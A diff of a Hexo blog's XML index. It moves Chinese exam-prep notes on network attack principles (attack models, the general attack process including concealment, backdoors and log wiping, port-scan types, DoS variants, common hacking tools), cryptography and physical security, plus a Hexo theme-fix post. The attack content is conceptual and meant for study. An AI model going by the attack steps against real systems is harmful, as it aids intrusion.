+    <url>/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="网络攻击概述"><a href="#网络攻击概述" class="headerlink" title="网络攻击概述"></a>网络攻击概述</h1><h2 id="网络攻击概念"><a href="#网络攻击概念" class="headerlink" title="网络攻击概念"></a>网络攻击概念</h2><p>常见的危害行为：</p>
+<ul>
+<li>信息泄露攻击</li>
+<li>完整性破坏攻击</li>
+<li>拒绝服务攻击</li>
+<li>非法使用攻击</li>
+</ul>
+<a id="more"></a>
+<p><img src="/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/攻击原理.jpg" alt></p>
+<h2 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h2><ol>
+<li>攻击树模型：进行费效或概率分析，建模复杂场景；不能建模循环事件。</li>
+<li>MITRE ATT&amp;CK模型：战术有访问初始化、执行、常驻、提权、防御规避、访问凭证、发现、横向移动、收集、数据获取、命令和控制。</li>
+<li>网络杀伤链模型：目标侦察、武器构造、载荷投送、漏洞利用、安装植入、指挥和控制、目标行动。</li>
+</ol>
+<h1 id="网络攻击的一般过程"><a href="#网络攻击的一般过程" class="headerlink" title="网络攻击的一般过程"></a>网络攻击的一般过程</h1><ol>
+<li>隐藏攻击源。（利用被侵入的主机作跳板、免费代理网关、伪造IP地址、假冒用户账号）</li>
+<li>收集攻击目标信息。（一般信息、配置信息、安全漏洞、安全防护措施、用户信息）</li>
+<li>挖掘漏洞信息。（系统或应用服务软件漏洞、主机信任关系漏洞、目标网络的使用者漏洞、通信协议漏洞、网络业务系统漏洞）</li>
+<li>获取目标访问权限。（获取更高权限）</li>
+<li>隐蔽攻击行为。（连接隐藏、进程隐藏、文件隐蔽）</li>
+<li>实施攻击。（攻击其他被信任的主机和网络，修改或删除重要数据，窃听、下载敏感数据，停止网络服务，删除数据账号，修改数据记录）</li>
+<li>开辟后门。（放宽文件许可权限，开放不安全服务，修改系统配置、源代码，替换共享库文件，安装嗅探器，建立隐蔽信道）</li>
+<li>清除攻击痕迹。（篡改日志文件的审计信息，改变系统时间造成日志文件紊乱，删除或停止审计服务进程，干扰入侵检测系统正常运行，修改完整性标签）</li>
+</ol>
+<h1 id="网络攻击常见技术方法"><a href="#网络攻击常见技术方法" class="headerlink" title="网络攻击常见技术方法"></a>网络攻击常见技术方法</h1><p><strong>端口扫描</strong></p>
+<ul>
+<li>完全连接扫描（利用三次握手，建立一次完整的连接）</li>
+<li>半连接扫描（三次握手过程中，只完成前两次握手）</li>
+<li>SYN扫描（发送连接请求，主机响应后，立即切断连接。若返回ACK信息，则表示端口开放，若返回RESET，则表示端口未开放）</li>
+<li>ID头信息扫描（源主机A向主机B发出连续PING包，源主机A假冒主机B向目标主机C发送SYN包，主机C向主机B发送两种可能的包（SYN|ACK，RST|ACK），查看主机B返回A的包ID头的值是否增加1，大于1则端口非开放。）</li>
+<li>隐蔽扫描（绕过IDS、防火墙等安全机制）</li>
+<li>SYN|ACK扫描（直接发送SYN|ACK包，目标主机认为是一次错误连接，若端口没开放，则返回RST信息；若端口开发，则不返回任何信息）</li>
+<li>FIN扫描（发送FIN包，若返回RESET信息，则端口关闭；若没返回任何信息，则端口开放）</li>
+<li>ACK扫描（先发送FIN包，查看反馈数据包的TTL值和WIN值。端口开放：TTL<64，WIN>0；端口关闭：TTL&gt;64，WIN=0）</64，WIN></li>
+<li>NULL扫描（源主机将数据包中ACK、FIN、RST、SYN、URG、PSH等标志位全部置空。若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
+<li>XMAS扫描（将数据包中ACK、FIN、RST、SYN、URG、PSH等头标志位全部置1.若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
+</ul>
+<p><strong>口令破解</strong></p>
+<p><strong>缓冲区溢出</strong></p>
+<p>攻击者将特意构造的攻击代码植入缓冲区溢出漏洞的程序中，改变漏洞程序的执行过程，获取攻击主机的控制权。</p>
+<p><strong>恶意代码</strong></p>
+<p>类型有计算机病毒、网络蠕虫、特洛伊木马、后门、逻辑炸弹、僵尸网络等</p>
+<p><strong>拒绝服务</strong></p>
+<p>特点：①难确认性②隐蔽性③资源有限性④软件复杂性</p>
+<ul>
+<li>同步包风暴（SYN Flood）</li>
+<li>UDP洪水（UDP Flood）</li>
+<li>Smurf攻击</li>
+<li>垃圾邮件</li>
+<li>消耗CPU和内存资源等拒绝服务攻击</li>
+<li>死亡之ping（ping of death）</li>
+<li>泪滴攻击（Teardrop Attack）</li>
+<li>分布式拒绝服务攻击（Distribute Denial of Service Attack）</li>
+</ul>
+<p><strong>网络钓鱼</strong></p>
+<p><strong>网络窃听</strong></p>
+<p>技术手段：网络嗅探、中间人攻击</p>
+<p><strong>SQL注入</strong></p>
+<p><strong>社交工程</strong></p>
+<p><strong>电子监听</strong></p>
+<p><strong>会话劫持</strong></p>
+<p><strong>漏洞扫描</strong></p>
+<p>扫描技术：CGI漏洞扫描、弱口令扫描、操作系统漏洞扫描、数据库漏洞扫描</p>
+<p><strong>代理技术</strong></p>
+<p><strong>数据加密</strong></p>
+<h1 id="黑客常用工具"><a href="#黑客常用工具" class="headerlink" title="黑客常用工具"></a>黑客常用工具</h1><p><strong>扫描器</strong>：NMAP、Nessus、SuperScan</p>
+<p><strong>远程监控</strong>：冰河、网络精灵、Netcat</p>
+<p><strong>密码破解</strong>：John the Ripper、LOphtCrack</p>
+<p><strong>网络嗅探器</strong>：Tcpdump/WireShark、DSniff</p>
+<p><strong>安全渗透工具箱</strong>：Metasploit、BackTrack5</p>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo及next主题使用问题记录</title>
+    <url>/2020/09/11/hexo%E5%8F%8Anext%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p><strong>不定期更新各类使用过程中遇到的问题</strong></p>
+<p>使用版本：hexo 5.1&amp;&amp;next 7.8</p>
+<a id="more"></a>
+<h1 id="问题一："><a href="#问题一：" class="headerlink" title="问题一："></a>问题一：</h1><p>点击“阅读全文”后，会直接滚动到原文中\<!-- more -->下，且config里面没有scroll_to_more配置，如何从头开始阅读。</p>
+<p>参考博文<a href="https://blog.csdn.net/weizhixiang/article/details/105112467">hexo关于next主题scroll_to_more失效</a>进行如下设置</p>
+<p>修改\themes\next\layout_macro\post.swig中</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;#more&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>为</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="问题二："><a href="#问题二：" class="headerlink" title="问题二："></a>问题二：</h1><p>markdown语法嵌入数学公式无法正常显示</p>
+<p>参考<a href="https://www.jianshu.com/p/7ab21c7f0674">在Hexo中渲染MathJax数学公式</a></p>
+<p>更换渲染引擎：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
+<p>更改node_modules\kramed\lib\rules\inline.js文件中第11行和第20行</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span></span><br><span class="line">  <span class="built_in">escape</span>: <span class="regexp">/^\\([`*\[\]()#$+\-.!_&gt;])/</span>，</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span></span><br><span class="line">  em: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span></span><br></pre></td></tr></table></figure>
+<p>在主题中配置文件中开启mathjax开关</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line">mathjax:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  per_page: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>还需要在文章的Front-matter里打开mathjax开关</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: index.html</span><br><span class="line">date: 2016-12-28 21:01:30</span><br><span class="line">tags:</span><br><span class="line">mathjax: true</span><br><span class="line">--</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>next</tag>
       </tags>
   </entry>
   <entry>
@@ -1078,118 +1190,6 @@
       </tags>
   </entry>
   <entry>
-    <title>第2章 网络攻击原理与常用方法</title>
-    <url>/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="网络攻击概述"><a href="#网络攻击概述" class="headerlink" title="网络攻击概述"></a>网络攻击概述</h1><h2 id="网络攻击概念"><a href="#网络攻击概念" class="headerlink" title="网络攻击概念"></a>网络攻击概念</h2><p>常见的危害行为：</p>
-<ul>
-<li>信息泄露攻击</li>
-<li>完整性破坏攻击</li>
-<li>拒绝服务攻击</li>
-<li>非法使用攻击</li>
-</ul>
-<a id="more"></a>
-<p><img src="/2020/09/10/%E7%AC%AC2%E7%AB%A0-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/攻击原理.jpg" alt></p>
-<h2 id="网络攻击模型"><a href="#网络攻击模型" class="headerlink" title="网络攻击模型"></a>网络攻击模型</h2><ol>
-<li>攻击树模型：进行费效或概率分析，建模复杂场景；不能建模循环事件。</li>
-<li>MITRE ATT&amp;CK模型：战术有访问初始化、执行、常驻、提权、防御规避、访问凭证、发现、横向移动、收集、数据获取、命令和控制。</li>
-<li>网络杀伤链模型：目标侦察、武器构造、载荷投送、漏洞利用、安装植入、指挥和控制、目标行动。</li>
-</ol>
-<h1 id="网络攻击的一般过程"><a href="#网络攻击的一般过程" class="headerlink" title="网络攻击的一般过程"></a>网络攻击的一般过程</h1><ol>
-<li>隐藏攻击源。（利用被侵入的主机作跳板、免费代理网关、伪造IP地址、假冒用户账号）</li>
-<li>收集攻击目标信息。（一般信息、配置信息、安全漏洞、安全防护措施、用户信息）</li>
-<li>挖掘漏洞信息。（系统或应用服务软件漏洞、主机信任关系漏洞、目标网络的使用者漏洞、通信协议漏洞、网络业务系统漏洞）</li>
-<li>获取目标访问权限。（获取更高权限）</li>
-<li>隐蔽攻击行为。（连接隐藏、进程隐藏、文件隐蔽）</li>
-<li>实施攻击。（攻击其他被信任的主机和网络，修改或删除重要数据，窃听、下载敏感数据，停止网络服务，删除数据账号，修改数据记录）</li>
-<li>开辟后门。（放宽文件许可权限，开放不安全服务，修改系统配置、源代码，替换共享库文件，安装嗅探器，建立隐蔽信道）</li>
-<li>清除攻击痕迹。（篡改日志文件的审计信息，改变系统时间造成日志文件紊乱，删除或停止审计服务进程，干扰入侵检测系统正常运行，修改完整性标签）</li>
-</ol>
-<h1 id="网络攻击常见技术方法"><a href="#网络攻击常见技术方法" class="headerlink" title="网络攻击常见技术方法"></a>网络攻击常见技术方法</h1><p><strong>端口扫描</strong></p>
-<ul>
-<li>完全连接扫描（利用三次握手，建立一次完整的连接）</li>
-<li>半连接扫描（三次握手过程中，只完成前两次握手）</li>
-<li>SYN扫描（发送连接请求，主机响应后，立即切断连接。若返回ACK信息，则表示端口开放，若返回RESET，则表示端口未开放）</li>
-<li>ID头信息扫描（源主机A向主机B发出连续PING包，源主机A假冒主机B向目标主机C发送SYN包，主机C向主机B发送两种可能的包（SYN|ACK，RST|ACK），查看主机B返回A的包ID头的值是否增加1，大于1则端口非开放。）</li>
-<li>隐蔽扫描（绕过IDS、防火墙等安全机制）</li>
-<li>SYN|ACK扫描（直接发送SYN|ACK包，目标主机认为是一次错误连接，若端口没开放，则返回RST信息；若端口开发，则不返回任何信息）</li>
-<li>FIN扫描（发送FIN包，若返回RESET信息，则端口关闭；若没返回任何信息，则端口开放）</li>
-<li>ACK扫描（先发送FIN包，查看反馈数据包的TTL值和WIN值。端口开放：TTL<64，WIN>0；端口关闭：TTL&gt;64，WIN=0）</64，WIN></li>
-<li>NULL扫描（源主机将数据包中ACK、FIN、RST、SYN、URG、PSH等标志位全部置空。若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
-<li>XMAS扫描（将数据包中ACK、FIN、RST、SYN、URG、PSH等头标志位全部置1.若未返回信息，则端口开放；若返回RST信息，则端口关闭）</li>
-</ul>
-<p><strong>口令破解</strong></p>
-<p><strong>缓冲区溢出</strong></p>
-<p>攻击者将特意构造的攻击代码植入缓冲区溢出漏洞的程序中，改变漏洞程序的执行过程，获取攻击主机的控制权。</p>
-<p><strong>恶意代码</strong></p>
-<p>类型有计算机病毒、网络蠕虫、特洛伊木马、后门、逻辑炸弹、僵尸网络等</p>
-<p><strong>拒绝服务</strong></p>
-<p>特点：①难确认性②隐蔽性③资源有限性④软件复杂性</p>
-<ul>
-<li>同步包风暴（SYN Flood）</li>
-<li>UDP洪水（UDP Flood）</li>
-<li>Smurf攻击</li>
-<li>垃圾邮件</li>
-<li>消耗CPU和内存资源等拒绝服务攻击</li>
-<li>死亡之ping（ping of death）</li>
-<li>泪滴攻击（Teardrop Attack）</li>
-<li>分布式拒绝服务攻击（Distribute Denial of Service Attack）</li>
-</ul>
-<p><strong>网络钓鱼</strong></p>
-<p><strong>网络窃听</strong></p>
-<p>技术手段：网络嗅探、中间人攻击</p>
-<p><strong>SQL注入</strong></p>
-<p><strong>社交工程</strong></p>
-<p><strong>电子监听</strong></p>
-<p><strong>会话劫持</strong></p>
-<p><strong>漏洞扫描</strong></p>
-<p>扫描技术：CGI漏洞扫描、弱口令扫描、操作系统漏洞扫描、数据库漏洞扫描</p>
-<p><strong>代理技术</strong></p>
-<p><strong>数据加密</strong></p>
-<h1 id="黑客常用工具"><a href="#黑客常用工具" class="headerlink" title="黑客常用工具"></a>黑客常用工具</h1><p><strong>扫描器</strong>：NMAP、Nessus、SuperScan</p>
-<p><strong>远程监控</strong>：冰河、网络精灵、Netcat</p>
-<p><strong>密码破解</strong>：John the Ripper、LOphtCrack</p>
-<p><strong>网络嗅探器</strong>：Tcpdump/WireShark、DSniff</p>
-<p><strong>安全渗透工具箱</strong>：Metasploit、BackTrack5</p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo及next主题使用问题记录</title>
-    <url>/2020/09/11/hexo%E5%8F%8Anext%E4%B8%BB%E9%A2%98%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p><strong>不定期更新各类使用过程中遇到的问题</strong></p>
-<p>使用版本：hexo 5.1&amp;&amp;next 7.8</p>
-<a id="more"></a>
-<h1 id="问题一："><a href="#问题一：" class="headerlink" title="问题一："></a>问题一：</h1><p>点击“阅读全文”后，会直接滚动到原文中\<!-- more -->下，且config里面没有scroll_to_more配置，如何从头开始阅读。</p>
-<p>参考博文<a href="https://blog.csdn.net/weizhixiang/article/details/105112467">hexo关于next主题scroll_to_more失效</a>进行如下设置</p>
-<p>修改\themes\next\layout_macro\post.swig中</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;#more&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>为</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;contents&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h1 id="问题二："><a href="#问题二：" class="headerlink" title="问题二："></a>问题二：</h1><p>markdown语法嵌入数学公式无法正常显示</p>
-<p>参考<a href="https://www.jianshu.com/p/7ab21c7f0674">在Hexo中渲染MathJax数学公式</a></p>
-<p>更换渲染引擎：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
-<p>更改node_modules\kramed\lib\rules\inline.js文件中第11行和第20行</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  escape: /^\\([\\`*&#123;&#125;\[\]()#$+\-.!_&gt;])/,</span></span><br><span class="line">  <span class="built_in">escape</span>: <span class="regexp">/^\\([`*\[\]()#$+\-.!_&gt;])/</span>，</span><br></pre></td></tr></table></figure>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  em: /^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)/,</span></span><br><span class="line">  em: <span class="regexp">/^\*((?:\*\*|[\s\S])+?)\*(?!\*)/</span></span><br></pre></td></tr></table></figure>
-<p>在主题中配置文件中开启mathjax开关</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># MathJax Support</span></span><br><span class="line">mathjax:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  per_page: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-<p>还需要在文章的Front-matter里打开mathjax开关</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: index.html</span><br><span class="line">date: 2016-12-28 21:01:30</span><br><span class="line">tags:</span><br><span class="line">mathjax: true</span><br><span class="line">--</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>next</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>第3章 密码学基本理论</title>
     <url>/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/</url>
     <content><![CDATA[<h1 id="密码学概况"><a href="#密码学概况" class="headerlink" title="密码学概况"></a>密码学概况</h1><p>密码学主要由密码编码和密码分析两个部分组成。密码编码学研究信息等变换处理以实现信息等安全保护，密码分析学研究通过密文获取对应的明文信息。</p>
@@ -1295,172 +1295,6 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
 <li>随身携带含有服务器公钥的拷贝，进行密钥交换前，读入客户端</li>
 <li>从公开信道下载公钥和指纹，通过电话验证公钥指纹的真实性，用HASH软件生成公钥指纹，进行比较</li>
 <li>通过PKI技术来验证服务器</li>
-</ol>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第5章 物理环境安全技术</title>
-    <url>/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="物理安全概念与要求"><a href="#物理安全概念与要求" class="headerlink" title="物理安全概念与要求"></a>物理安全概念与要求</h1><h2 id="物理安全威胁"><a href="#物理安全威胁" class="headerlink" title="物理安全威胁"></a>物理安全威胁</h2><p>常见威胁：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/物理安全威胁.jpg" alt></p>
-<a id="more"></a>
-<p>攻击技术：硬件木马、硬件协同的恶意代码、硬件安全漏洞利用、基于软件漏洞攻击硬件实体、基于环境攻击计算机实体。</p>
-<h2 id="物理安全保护"><a href="#物理安全保护" class="headerlink" title="物理安全保护"></a>物理安全保护</h2><ol>
-<li>设备物理安全：有标志和标记、防止电磁信息泄露、抗电磁干扰、安全漏洞等</li>
-<li>环境物理安全：机房选择、防护</li>
-<li>系统物理安全：存储介质，灾备、访问保护</li>
-</ol>
-<p>方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份等。</p>
-<h2 id="物理安全规范"><a href="#物理安全规范" class="headerlink" title="物理安全规范"></a>物理安全规范</h2><p>《信息系统物理安全技术要求（GB/T 21052-2007）》分4级保护：</p>
-<ol>
-<li>第一级用户自主保护级提供基本的物理安全保护</li>
-<li>第二级系统审计保护级提供适当的物理安全保护</li>
-<li>第三级安全标记保护级提供较高程度的物理安全保护</li>
-<li>第四级结构化保护级提供更高程度的物理安全保护</li>
-</ol>
-<h1 id="物理环境安全分析与防护"><a href="#物理环境安全分析与防护" class="headerlink" title="物理环境安全分析与防护"></a>物理环境安全分析与防护</h1><ol>
-<li><p><strong> 防火</strong></p>
-<p>理想灭火材料：卤代烷1211和1301灭火剂</p>
-</li>
-<li><p><strong>防水</strong></p>
-<p>不要把机房设置在楼房底层或地下室</p>
-</li>
-<li><p><strong>防震</strong></p>
-</li>
-<li><p><strong>防盗</strong></p>
-<p>报警器和监控、物理访问控制</p>
-</li>
-<li><p><strong>防鼠虫害</strong></p>
-<p>危害：咬坏电缆或引起电源短路</p>
-</li>
-<li><p><strong>防雷</strong></p>
-<p>避雷针及专用防雷设施，设备接地</p>
-</li>
-<li><p><strong>防电磁</strong></p>
-<p>防止电磁干扰，防止信息通过电磁泄漏。措施：接地、屏蔽、选择合适场地</p>
-</li>
-<li><p><strong>防静电</strong></p>
-<p>人员服装、机房温湿度、材料、操作戴防静电手套</p>
-</li>
-<li><p><strong>安全供电</strong></p>
-<p>专用电线路、不间断电源（UPS）、备用发电机</p>
-</li>
-</ol>
-<h1 id="机房安全分析与防护"><a href="#机房安全分析与防护" class="headerlink" title="机房安全分析与防护"></a>机房安全分析与防护</h1><h2 id="机房功能区域组成"><a href="#机房功能区域组成" class="headerlink" title="机房功能区域组成"></a>机房功能区域组成</h2><p>《计算机场地通用规范（GB/T 2887-2011）》（允许一室多用或酌情增减）：</p>
-<ol>
-<li>主要工作房间：主机房、终端室等；</li>
-<li>第一类辅助房间：低压配电间、不间断电源室、空调机室、发电机室、气体钢瓶室、监控室等</li>
-<li>第二类辅助房间：资料室、维修室、技术人员办公室</li>
-<li>第三类辅助房间：储藏室、缓冲间、技术人员休息室、盥洗室</li>
-</ol>
-<h2 id="机房安全等级划分"><a href="#机房安全等级划分" class="headerlink" title="机房安全等级划分"></a>机房安全等级划分</h2><p>《计算机场地通用规范（GB/T 2887-2011）》分为A、B、C三级：</p>
-<ul>
-<li>A：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成严重损害</li>
-<li>B：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成较大损害的</li>
-<li>C：不属于A、B级的情况</li>
-</ul>
-<p>安全级别要求：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-1.jpg" alt></p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-2.jpg" alt></p>
-<h2 id="机房场地选择要求"><a href="#机房场地选择要求" class="headerlink" title="机房场地选择要求"></a>机房场地选择要求</h2><ol>
-<li><p>环境安全性</p>
-<p>避开：危险来源区、环境污染区、盐雾区、落雷区</p>
-</li>
-<li><p>地质可靠性</p>
-<p>避开：杂填土、地层断裂、地质不牢靠、有开采价值矿区、低洼、潮湿</p>
-</li>
-<li><p>场地抗电磁干扰性</p>
-<p>避开：无线电干扰源和微波线路的强电磁场干扰场所（不大于800A/m，100e）、强电流冲击</p>
-</li>
-<li><p>应避开强振动源和强噪音源</p>
-<p>避开：振动源、机场、主要道路</p>
-</li>
-<li><p>应避免设在建筑物的高层以及用水设备的下层或隔壁</p>
-</li>
-</ol>
-<h2 id="数据中心建设与设计要求"><a href="#数据中心建设与设计要求" class="headerlink" title="数据中心建设与设计要求"></a>数据中心建设与设计要求</h2><ul>
-<li>超大型数据中心：&gt;=10000个标准机架；重点考虑气候环境、能源供给，优先在气候寒冷、能源充足的一类或气候适宜，能源充足的二类地区。</li>
-<li>大型数据中心：&gt;=3000，&lt;10000标准机架；重点考虑气候环境、能源供给，优先在一类二类地区，也可在气候适宜，靠近能源富集地的三类地区</li>
-<li>中小型数据中心：&lt;3000标准机架；重点考虑市场需求、能源供给，在靠近用户所在地、能源获取便利的地区建设。</li>
-</ul>
-<p>《设计规范》（2018.1.1）将数据中心分为A、B、C三级，强制性条文简述：</p>
-<ul>
-<li>所有设备的金属外壳、各类金属管道、金属线槽、建筑物金属结构必须进行等电位联结并接地（8.4.4）</li>
-<li>耐火等级不应低于二级（13.2.1）</li>
-<li>与气体供能用房在统一建筑内时，两者之间采用耐火极限不低于2.0h的防火隔墙和1.5h的楼板，隔墙上开门采用甲级防火门（13.2.4）</li>
-<li>采用管网式气体或细水雾灭火系统的主机房，应同时设置两组独立的火灾探测器，火灾报警系统英语灭火系统和视频监控系统联动（13.3.1）</li>
-<li>设置气体灭火系统的主机房，应配置专用空气呼吸器或氧气呼吸器（13.4.1）</li>
-</ul>
-<h2 id="互联网数据中心"><a href="#互联网数据中心" class="headerlink" title="互联网数据中心"></a>互联网数据中心</h2><p>IDC六大逻辑组成部分：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/IDC逻辑组成.jpg" alt></p>
-<p>《互联网数据中心工程技术规范（GB 51195-2016）》（2017.4.1）划分为R1（可用性不小于99.5%），R2（不小于99.9%），R3（不小于99.99%）3个级别，强制性条文简述：</p>
-<ul>
-<li>抗震设防烈度7度以上（含7度）地区，主要电信设备必须经过性能检测合格</li>
-<li>对肌肤安全条件进行全面检查：灭火器材，非燃材料，不同电压的电源设备、电源插座应有明显区别标志。</li>
-</ul>
-<h2 id="CA机房物理安全控制"><a href="#CA机房物理安全控制" class="headerlink" title="CA机房物理安全控制"></a>CA机房物理安全控制</h2><p>《电子政务电子认证服务业务规则规范》，提出规范性要求。</p>
-<ol>
-<li>物理环境按照GM/T 0034要求严格实施，至少每五年进行一次屏蔽室检测</li>
-<li>所有人员应佩戴标识身份的证明</li>
-<li>进出人员留有记录，并妥善、安全的保管。（监控录像、门禁记录）</li>
-<li>建立并执行人员访问制度及程序，对访问人员进行监督和监控</li>
-<li>保护设备免于电源故障或网络通信异常影响</li>
-<li>处理或再利用存储介质，检查是否含有敏感数据，并物理销毁或安全覆盖</li>
-<li>制定相关安全检查、监督策略。</li>
-</ol>
-<h1 id="网络通信线路安全分析与防护"><a href="#网络通信线路安全分析与防护" class="headerlink" title="网络通信线路安全分析与防护"></a>网络通信线路安全分析与防护</h1><h2 id="网络通信线路安全分析"><a href="#网络通信线路安全分析" class="headerlink" title="网络通信线路安全分析"></a>网络通信线路安全分析</h2><p>威胁：</p>
-<ul>
-<li>网络通信线路被切断</li>
-<li>网络通信线路被电磁干扰</li>
-<li>网络通信线路泄漏信息</li>
-</ul>
-<h2 id="网络通信线路安全防护"><a href="#网络通信线路安全防护" class="headerlink" title="网络通信线路安全防护"></a>网络通信线路安全防护</h2><p>两个方面：</p>
-<ul>
-<li>网络通信设备：采取设备冗余</li>
-<li>网络通信线路：采取多路通信</li>
-</ul>
-<h1 id="设备安全分析与防护"><a href="#设备安全分析与防护" class="headerlink" title="设备安全分析与防护"></a>设备安全分析与防护</h1><h2 id="设备实体安全分析"><a href="#设备实体安全分析" class="headerlink" title="设备实体安全分析"></a>设备实体安全分析</h2><ol>
-<li>设备实体环境关联安全威胁</li>
-<li>设备实体被盗取或损害</li>
-<li>设备实体受到电磁干扰</li>
-<li>设备供应链条中断或延缓</li>
